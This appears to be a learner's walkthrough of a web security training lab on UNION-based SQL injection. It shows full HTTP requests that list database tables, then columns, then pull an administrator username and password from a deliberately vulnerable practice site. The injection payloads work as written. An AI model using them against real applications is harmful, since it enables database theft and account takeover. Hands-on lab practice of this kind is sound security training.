# SQL injection attack, listing the database contents on non-Oracle databases

### First checked there are two columns present , using `table_name` found the names present in databases
**Request**
```http
GET /filter?category=Corporate+gifts'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables-- HTTP/2
Host: 0ad900280397f67e81c72a4e0092009c.web-security-academy.net
Cookie: session=[REDACTED]
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ad900280397f67e81c72a4e0092009c.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```
**Response**
```html
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 29236

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>SQL injection attack, listing the database contents on non-Oracle databases
        [...middle remain omitted...]
           <a class="filter-category" href="/filter?category=Toys+%26+Games">Toys & Games</a>
        </section>
        <table class="is-table-longdescription">
            <tbody>
            <tr>
                <th>pg_partitioned_table</th>
            </tr>
            <tr>
                <th>pg_available_extension_versions</th>
            </tr>
            <tr>
                <th>pg_shdescription</th>
            </tr>
            <tr>
                <th>user_defined_types</th>
            </tr>
            <tr>
            [...middle remain omitted...]
            <tr>
                <th>pg_statio_sys_indexes</th>
            </tr>
            <tr>
                <th>pg_database</th>
            </tr>
            <tr>
                <th>users_yhuygj</th>
            </tr>
            <tr>
                <th>user_mappings</th>
            </tr>
            <tr>
                    <th>foreign_data_wrapper_options</th>
                </tr>
                </tbody>
            </table>
        </div>
    </section>
    <div class="footer-wrapper">
    </div>
</div>
</body>
</html>
```
### In the lab it told to find the table name starting with `users_*` and found one `users_yhuygj` .

---
###  Now i need to get the names of column names and used `column_name` to see the values and included the table name i got .

**Request**
```http
GET /filter?category=Corporate+gifts'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_yhuygj'-- HTTP/2
Host: 0ad900280397f67e81c72a4e0092009c.web-security-academy.net
Cookie: session=[REDACTED]
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ad900280397f67e81c72a4e0092009c.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

**Response**
```html
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 9461

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>SQL injection attack, listing the database contents on non-Oracle databases</title>
        [...middle remain omitted...]
       <table class="is-table-longdescription">
    <tbody>
    <tr>
        <th>username_ikihit</th>
    </tr>
    <tr>
        <th>Folding Gadgets</th>
        [...middle remain omitted...]
           <tr>
        <th>password_rtrkrk</th>
    </tr>
    <tr>
        <th>Com-Tool</th>
        [...remaining are omitted...]
```
### Now i retrieved the column names present starting with `username_*` and `password_*` and found both .

---

### By giving the column names and table name i can see the users present .
```http
GET /filter?category=Corporate+gifts'+UNION+SELECT+username_ikihit,+password_rtrkrk+FROM+users_yhuygj---- HTTP/2
Host: 0ad900280397f67e81c72a4e0092009c.web-security-academy.net
Cookie: session=[REDACTED]
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ad900280397f67e81c72a4e0092009c.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

**Response**
```html
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 9378

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>SQL injection attack, listing the database contents on non-Oracle databases</title>
    </head>
    [...middle remain omitted...]
                  <tr>
                      <th>administrator</th>
                      <td>ibm21gw5zw00hkoxfhyv</td>
                  </tr>
                </tbody>
            </table>
        </div>
    </section>
    <div class="footer-wrapper">
    </div>
</div>
</body>
</html>
```
### I got the username 'administrator' and the password. Now I can login with this . 





        
